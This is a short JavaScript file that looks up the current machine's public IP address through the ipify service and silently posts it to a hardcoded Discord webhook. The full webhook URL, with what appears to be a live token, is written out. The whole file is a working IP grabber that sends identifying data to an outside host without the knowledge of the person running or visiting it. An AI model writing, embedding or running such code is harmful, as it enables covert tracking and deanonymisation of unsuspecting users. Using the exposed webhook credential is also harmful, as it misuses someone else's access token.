const ipifyURL = 'https://api.ipify.org/?format=json';
const webhookURL = 'https://discord.com/api/webhooks/1152367009422655529/JEy6iEcsFdoIY5hYVXtrWlGbOVPiQHpRoGTBwFkc2jg2x-uxWczUTy7qOaZqiEHrgIvo';

// Fetch the IP address from ipify API
fetch(ipifyURL)
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip; 

    const payload = {
      content: `Current IP Address: ${ipAddress}`,
    };


    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })
      .then(response => {
        if (response.ok) {
          console.log('IP address data sent successfully to the Discord webhook.');
        } else {
          console.error('Failed to send IP address data to the Discord webhook.');
        }
      })
      .catch(error => {
        console.error('An error occurred:', error);
      });
  })
  .catch(error => {
    console.error('An error occurred while fetching IP address:', error);
  });